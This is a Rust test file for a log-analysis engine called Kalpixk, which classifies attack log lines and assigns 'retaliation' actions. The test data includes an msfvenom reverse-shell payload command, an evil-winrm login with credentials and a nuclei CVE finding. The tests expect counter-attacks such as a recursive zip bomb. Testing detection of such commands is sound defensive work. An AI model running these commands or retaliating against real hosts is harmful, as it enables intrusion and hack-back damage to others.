//! offensive_tests.rs — Pruebas de contra-defensa de Kalpixk
//!
//! Simula ataques de RedTeam y verifica la respuesta del motor.

use kalpixk_core::{analyze_and_retaliate, parse_log_line};
use serde_json::Value;

#[test]
fn test_recon_retaliation() {
    let raw = "Apr  5 02:00:00 server nuclei[123]: Found CVE-2021-41773 on host";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    assert_eq!(v["node"], "recon");
    assert!(v["score"].as_f64().unwrap() >= 0.5);
    assert_eq!(v["retaliation"]["retaliation_action"], "GarbageInjection");
}

#[test]
fn test_payload_exterminio() {
    let raw = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=45.33.32.156";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    assert_eq!(v["node"], "payload");
    assert_eq!(v["offense_level"], "Exterminio");
    assert_eq!(v["retaliation"]["retaliation_action"], "RecursiveZipBomb");
}

#[test]
fn test_lateral_poisoning() {
    let raw = "evil-winrm -i 192.168.1.50 -u admin -p password";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    assert_eq!(v["node"], "lateral");
    assert_eq!(v["retaliation"]["retaliation_action"], "PoisonPointers");
}
